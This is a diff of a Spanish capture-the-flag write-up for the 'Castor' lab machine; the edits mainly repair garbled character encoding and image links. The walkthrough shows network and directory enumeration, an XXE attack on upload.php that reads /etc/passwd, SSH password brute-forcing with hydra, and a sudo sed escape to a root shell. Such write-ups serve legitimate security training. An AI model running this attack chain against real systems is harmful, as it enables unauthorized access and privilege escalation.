@@ -27,12 +27,12 @@ Herramientas:
   - hydra
 Fecha: 2026-03-04
 ---
-<img width="800" height="800" alt="Pasted image 20260304125815" src="https://github.com/user-attachments/assets/78971801-a627-423c-aa85-25b1361d0b4c" />
+![[../../attachments/Pasted image 20260304125815.png|697]]
 
 Empezaremos con un descubrimiento de *IP* dentro de la red para ver donde se encuentra nuestro objetivo.
 
 ```bash
-é sudo arp-scan -I eth0 --localnet                                  
+ sudo arp-scan -I eth0 --localnet                                  
 
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
@@ -47,22 +47,22 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.949 seconds (131.35 hosts/sec). 4 responded
 ```
 
-Vemos que la maquina se encuentra en la direcci├│n **10.0.11.13** as├¡ que empecemos con la enumeraci├│n de puertos.
+Vemos que la maquina se encuentra en la dirección **10.0.11.13** así que empecemos con la enumeración de puertos.
 
 ```bash
-settarget 10.0.11.13            
+ settarget 10.0.11.13            
 TARGET establecido: 10.0.11.13
 
-gomap -s $TARGET     
+ gomap -s $TARGET     
 
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
- ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
-  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
+  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
+ ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
+ ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
+ ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+ ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
+  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 
-­ Scanning 10.0.11.13 (997 ports)
+🎯 Scanning 10.0.11.13 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u3
@@ -71,25 +71,25 @@ PORT    STATE  SERVICE         VERSION
 Host Exposure Summary
 - 10.0.11.13 | open ports: 2 | critical: ssh | exposure: medium
 
-Ô£ô Completed scan in 1.18s | hosts: 1 | open ports: 2
+✓ Completed scan in 1.18s | hosts: 1 | open ports: 2
 ```
 
 Tenemos 2 puertos abiertos:
-- 22 para conexi├│n *SSH*
+- 22 para conexión *SSH*
 - 80  para *HTTP* web
 
 Con estos indicios empezaremos por ver que hay en la web.
 
-A primera vista no encontramos nada, solo una web est├ítica sobre madera, con un formulario de contacto que no funciona, al ver el c├│digo de la web mediante *CTRL+U* no encontramos nada de inter├®s salvo un *js* que contiene una linea nada mas.
+A primera vista no encontramos nada, solo una web estática sobre madera, con un formulario de contacto que no funciona, al ver el código de la web mediante *CTRL+U* no encontramos nada de interés salvo un *js* que contiene una linea nada mas.
 
 ```javascript
 console.log("CastorTech funcionando correctamente");
 ```
 
-Vamos a realizar una enumeraci├│n de directorios a ver si encontramos algo.
+Vamos a realizar una enumeración de directorios a ver si encontramos algo.
 
 ```bash
-é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
+ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -127,7 +127,7 @@ Vamos a probar con **upload.php** a ver si podemos subir algo, pero nos encontra
 xml not provided
 ```
 
-Probaremos con *Burp Suite* para interceptar las peticiones y as├¡ poder realizar peticiones con contenido *XML* y ver sus respuestas.
+Probaremos con *Burp Suite* para interceptar las peticiones y así poder realizar peticiones con contenido *XML* y ver sus respuestas.
 
 Empecemos con algo simple y veamos que ocurre.
 
@@ -136,9 +136,9 @@ Empecemos con algo simple y veamos que ocurre.
 <test>test</test>
 ```
 
-<img width="1071" height="606" alt="Pasted image 20260304134200" src="https://github.com/user-attachments/assets/5d9c15dd-7b20-4ace-9134-66c46800a824" />
+![[../../attachments/Pasted image 20260304134200.png]]
 
-El fichero `upload.php` procesa contenido XML sin deshabilitar la resoluci├│n de entidades externas.
+El fichero `upload.php` procesa contenido XML sin deshabilitar la resolución de entidades externas.
 
 Esto permite realizar un ataque **XML External Entity (XXE)** para acceder a archivos locales del sistema.
 
@@ -188,10 +188,10 @@ castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
 </root>
 ```
 
-De este listado vemos un usuario que nos puede servir **castorcin** as├¡ que ahora toca mirar si encontramos la contrase├▒a contra *SSH*.
+De este listado vemos un usuario que nos puede servir **castorcin** así que ahora toca mirar si encontramos la contraseña contra *SSH*.
 
 ```bash
-é hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+ hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-04 13:48:06
@@ -205,7 +205,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-04 13:48:
 Ahora con los credenciales toca explorar el servidor para ver que podemos obtener.
 
 ```bash
-é ssh castorcin@$TARGET
+ ssh castorcin@$TARGET
 The authenticity of host '10.0.11.13 (10.0.11.13)' can't be established.
 ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
 This key is not known by any other names.
@@ -251,7 +251,7 @@ castorcin@TheHackersLabs-Castor:~$ find / -perm -4000 2>/dev/null
 castorcin@TheHackersLabs-Castor:~$ 
 ```
 
-Parece que tenemos una opci├│n de escalada mediante **sed** y en la web de [GtfoBins](https://gtfobins.org/gtfobins/sed/) tenemos algo que podemos aprovechar.
+Parece que tenemos una opción de escalada mediante **sed** y en la web de [GtfoBins](https://gtfobins.org/gtfobins/sed/) tenemos algo que podemos aprovechar.
 
 ```bash
 castorcin@TheHackersLabs-Castor:~$ sudo -u root sed -n '1e exec /bin/sh -p 1>&0' /etc/hosts
@@ -263,5 +263,3 @@ congrats.txt  root.txt
 ```
 
 Y con esto hemos conseguido acceder como **root** al sistema y comprometerlo.
-
-
